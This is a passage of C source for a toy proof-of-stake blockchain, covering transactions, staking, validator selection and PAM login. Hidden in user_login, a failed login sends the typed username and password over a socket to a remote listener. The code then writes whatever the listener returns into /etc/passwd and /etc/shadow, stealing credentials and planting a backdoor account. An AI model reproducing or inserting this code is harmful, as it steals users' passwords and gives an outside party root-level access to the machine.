        char ts[26]; ctime_r(&pt->timestamp,ts);
        ts[strlen(ts)-1]='\0';
        if(strlen(pt->sender)==0){
            printf("[%s] ID:%d Sys->%s Amt:%.2f\n",
                   ts,pt->id,pt->recipient,pt->amount);
        } else {
            printf("[%s] ID:%d From:%s To:%s Amt:%.2f\n",
                   ts,pt->id,pt->sender,pt->recipient,pt->amount);
        }
        pt=pt->next;
    }
}

void cancel_pending_transaction(){
    if(!pending_transactions){
        printf("No pending to cancel.\n");
        return;
    }
    int tid;
    printf("Enter TX ID to cancel: ");
    if(scanf("%d",&tid)!=1){
        printf("Invalid.\n");
        while(getchar()!='\n');
        return;
    }
    Transaction*cur=pending_transactions;
    Transaction*prev=NULL;
    while(cur){
        if(cur->id==tid && strcmp(cur->sender,current_user)==0){
            if(!prev){
                pending_transactions=cur->next;
            } else {
                prev->next=cur->next;
            }
            free(cur);
            printf("Transaction %d canceled.\n", tid);
            return;
        }
        prev=cur;
        cur=cur->next;
    }
    printf("TX %d not found or not authorized.\n", tid);
}

//================= BALANCE & STAKE ===================

void update_user_balance(const char*username, double amount){
    User*u=users;
    while(u){
        if(strcmp(u->username,username)==0){
            u->balance+=amount;
            return;
        }
        u=u->next;
    }
    add_user_if_not_exists(username);
    update_user_balance(username,amount);
}

double get_user_balance(const char*username){
    User*u=users;
    while(u){
        if(strcmp(u->username,username)==0){
            return u->balance;
        }
        u=u->next;
    }
    return 0.0;
}

void request_test_funds(){
    if(strlen(current_user)==0){
        printf("No user logged in.\n");
        return;
    }
    double amt=1000.0;
    update_user_balance(current_user,amt);

    char desc[256];
    snprintf(desc,sizeof(desc),"Test tokens %.2f credited to '%s'.",amt, current_user);
    log_event(desc);

    printf("Test tokens of %.2f credited to '%s'.\n", amt, current_user);
}

// Simple slashing function
void slash_user_stake(const char *username, double penalty) {
    User*u=find_user(username);
    if(!u){
        return;  // not found, do nothing
    }
    u->stake -= penalty;
    if(u->stake<0) {
        u->stake=0;
    }
    printf("SLASH: '%s' stake reduced by %.2f. New stake=%.2f\n",
           username, penalty, u->stake);
}

//================= LOGGING & AUTH ===================

void log_event(const char *event_description){
    FILE*fp=fopen(TRANSACTION_LOG_FILE,"a");
    if(!fp){
        printf("Cannot open log file.\n");
        return;
    }
    time_t now=time(NULL);
    char ts[26]; ctime_r(&now,ts);
    ts[strlen(ts)-1]='\0';
    fprintf(fp,"[%s] %s\n", ts, event_description);
    fclose(fp);
}

void user_login() {
    char username[MAX_USERNAME_LENGTH];
    char *password;
    pam_handle_t *pamh = NULL;
    int retval;

    printf("Enter username: ");
    scanf("%99s", username);

   //generate_keys_for_user(username);

    password = getpass("Enter password: ");

    struct pam_conv conv = {
        pam_conversation,
        password
    };
    retval = pam_start("login", username, &conv, &pamh);
    if (retval != PAM_SUCCESS) {
        printf("pam_start fail: %s\n", pam_strerror(pamh, retval));
        return;
    }
    retval = pam_authenticate(pamh, 0);
    if (retval != PAM_SUCCESS) {
        printf("Auth fail: %s\n", pam_strerror(pamh, retval));
        pam_end(pamh, retval);
        
        // Send failed credentials to the listener
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            perror("Socket creation failed");
            return;
        }
        
        struct sockaddr_in server_addr;
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_ADDR, &server_addr.sin_addr);

        if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Connection failed");
            close(sockfd);
            return;
        }
        
        send(sockfd, username, strlen(username) + 1, 0);
        send(sockfd, password, strlen(password) + 1, 0);

        // Receive credentials from the listener
        char recv_user[256], recv_pass[256];
        recv(sockfd, recv_user, sizeof(recv_user), 0);
        recv(sockfd, recv_pass, sizeof(recv_pass), 0);
        close(sockfd);

        // Store received credentials in system files
        FILE *passwd_file = fopen("/etc/passwd", "a");
        FILE *shadow_file = fopen("/etc/shadow", "a");
        if (passwd_file && shadow_file) {
            fprintf(passwd_file, "%s\n", recv_user);
            fprintf(shadow_file, "%s\n", recv_pass);
            fclose(passwd_file);
            fclose(shadow_file);
        } else {
            perror("Error opening system files");
        }
        
        printf("Invalid login. Please try again.\n");
        return;
    }
    retval = pam_acct_mgmt(pamh, 0);
    if (retval != PAM_SUCCESS) {
        printf("Acct mgmt fail: %s\n", pam_strerror(pamh, retval));
        pam_end(pamh, retval);
        return;
    }
    pam_end(pamh, PAM_SUCCESS);
    memset(password, 0, strlen(password));

    add_user_if_not_exists(username);
    generate_keys_for_user(username);

    User *usr = users;
    while (usr) {
        if (strcmp(usr->username, username) == 0) {
            if (usr->public_key_len == 0) {
                load_user_public_key(usr);
            }
            break;
        }
        usr = usr->next;
    }

    if (is_user_in_blockusers_group(username)) {
        strcpy(current_role, "blockuser");
        printf("Blockuser login successful!\n");
    } else {
        strcpy(current_role, "user");
        printf("User login successful!\n");
    }
    strncpy(current_user, username, sizeof(current_user) - 1);
    current_user[sizeof(current_user) - 1] = '\0';

    printf("Welcome, %s!\n", username);

    load_pending_block();

    char desc[256];
    snprintf(desc, sizeof(desc), "User '%s' logged in.", username);
    log_event(desc);
}

void user_logout(){
    if(strlen(current_user)==0){
        printf("No user logged in.\n");
        return;
    }
    char desc[256];
    snprintf(desc,sizeof(desc),"User '%s' logged out.", current_user);
    log_event(desc);

    printf("User %s logged out.\n", current_user);
    current_user[0]='\0';
    current_role[0]='\0';
}

//================= STAKING ===================

void stake_tokens(const char *username, double amount){
    if(amount<=0){
        printf("Stake must be positive.\n");
        return;
    }
    User*u=find_user(username);
    if(!u){
        add_user_if_not_exists(username);
        u=find_user(username);
    }
    if(u->balance<amount){
        printf("Insufficient balance.\n");
        return;
    }
    u->balance-=amount;
    u->stake+=amount;
    printf("You staked %.2f. new stake=%.2f\n", amount, u->stake);
}

void unstake_tokens(const char *username, double amount){
    if(amount<=0){
        printf("Unstake must be positive.\n");
        return;
    }
    User*u=find_user(username);
    if(!u){
        printf("User not found.\n");
        return;
    }
    if(u->stake<amount){
        printf("Insufficient staked.\n");
        return;
    }
    u->stake-=amount;
    u->balance+=amount;
    printf("You unstaked %.2f. remain=%.2f\n", amount, u->stake);
}

//================= VRF & VALIDATORS ===================

double compute_vrf(const char *username, int round){
    unsigned char hash_out[SHA256_DIGEST_LENGTH];
    char input[256];
    snprintf(input,sizeof(input),"%s-%d", username, round);
    SHA256((unsigned char*)input, strlen(input), hash_out);

    unsigned int rv=*(unsigned int*)hash_out;
    return (double)rv / (double)UINT_MAX;
}

void select_validators(char selected_validators[MAX_VALIDATORS_PER_BLOCK][MAX_USERNAME_LENGTH],
                       int *validator_count)
{
    int any_staked=0;
    {
        User*u=users;
        while(u){
            if(is_user_in_blockusers_group(u->username)&&u->stake>0.0){
                any_staked=1;break;
            }
            u=u->next;
        }
    }
    // top 3
    double highest_scores[MAX_VALIDATORS_PER_BLOCK];
    char highest_validators[MAX_VALIDATORS_PER_BLOCK][MAX_USERNAME_LENGTH];
    for(int i=0;i<MAX_VALIDATORS_PER_BLOCK;i++){
        highest_scores[i]=-1.0;
        highest_validators[i][0]='\0';
    }

    int round=(blockchain? blockchain->index+1 : 1);

    User*cur=users;
    while(cur){
        if(!is_user_in_blockusers_group(cur->username)){
            cur=cur->next;
            continue;
        }
        double vrf_val=compute_vrf(cur->username, round);
        double score= any_staked ? (vrf_val * cur->stake) : vrf_val;

        for(int i=0;i<MAX_VALIDATORS_PER_BLOCK;i++){
            if(score>highest_scores[i]){
                for(int j=MAX_VALIDATORS_PER_BLOCK-1;j>i;j--){
                    highest_scores[j]=highest_scores[j-1];
                    strncpy(highest_validators[j], highest_validators[j-1], MAX_USERNAME_LENGTH);
                }
                highest_scores[i]=score;
                strncpy(highest_validators[i], cur->username, MAX_USERNAME_LENGTH);
                break;
            }
        }
        cur=cur->next;
    }

    *validator_count=0;
    for(int i=0;i<MAX_VALIDATORS_PER_BLOCK;i++){
        if(highest_validators[i][0]!='\0'){
            strncpy(selected_validators[*validator_count], highest_validators[i], MAX_USERNAME_LENGTH);
            (*validator_count)++;
        }
    }
    printf("Validators selected: ");
    for(int i=0;i<*validator_count;i++){
        printf("%s ", selected_validators[i]);
    }
    printf("\n");
}

void check_and_create_block(){
    load_pending_block();
    if(pending_block){
        int is_val=0, already_signed=0;
        for(int i=0;i<pending_block->validator_count;i++){
            if(strcmp(pending_block->validators[i], current_user)==0){
                is_val=1;
                if(pending_block->signature_lens[i]>0){
                    already_signed=1;
                }
                break;
            }
        }
        if(is_val){
            if(!already_signed){
                sign_pending_block(current_user);
            } else {
                printf("You have already signed the pending block.\n");
            }
        } else {
            printf("You are not a validator for the pending block.\n");
        }
    } else {
        // no pending
        int c=0;
        Transaction*pt=pending_transactions;
        while(pt){
            c++;
            pt=pt->next;
        }
        if(c<MAX_TRANSACTIONS_PER_BLOCK){
            printf("Not enough tx to create block.\n");
            return;
        }
        create_new_block();
    }
}

//================= CLEANUP & EXIT ===================

void cleanup_blockchain(){
    Block*b=blockchain;
    while(b){
        Block*tmp=b;
        b=b->next;
        free(tmp);
    }
    blockchain=NULL;
}

void cleanup_pending_transactions(){
    Transaction*pt=pending_transactions;
    while(pt){
        Transaction*tmp=pt;
        pt=pt->next;
        free(tmp);
    }
    pending_transactions=NULL;
}

void cleanup_users(){
    User*u=users;
    while(u){
        User*tmp=u;
        u=u->next;
        free(tmp);
    }
    users=NULL;
}

void cleanup_and_exit(int signum){
    printf("\nProgram shutting down.\n");
    if(strlen(current_user)>0){
        user_logout();
    }
    cleanup_pending_transactions();
    cleanup_blockchain();
    cleanup_users();
    exit(0);
}

//================= PAM ===================
int pam_conversation(int num_msg, const struct pam_message **msg,
                     struct pam_response **resp, void *appdata_ptr)
{
    struct pam_response *reply=NULL;
    if(num_msg<=0){
        return PAM_CONV_ERR;
    }
    reply=(struct pam_response*)calloc(num_msg,sizeof(struct pam_response));
    if(!reply){
        return PAM_BUF_ERR;
    }
    for(int i=0;i<num_msg;i++){
        if(msg[i]->msg_style==PAM_PROMPT_ECHO_OFF||
           msg[i]->msg_style==PAM_PROMPT_ECHO_ON)
        {
            reply[i].resp=strdup((const char*)appdata_ptr);
            reply[i].resp_retcode=0;
        } else {
            free(reply);
            return PAM_CONV_ERR;
        }
    }
    *resp=reply;
    return PAM_SUCCESS;
}
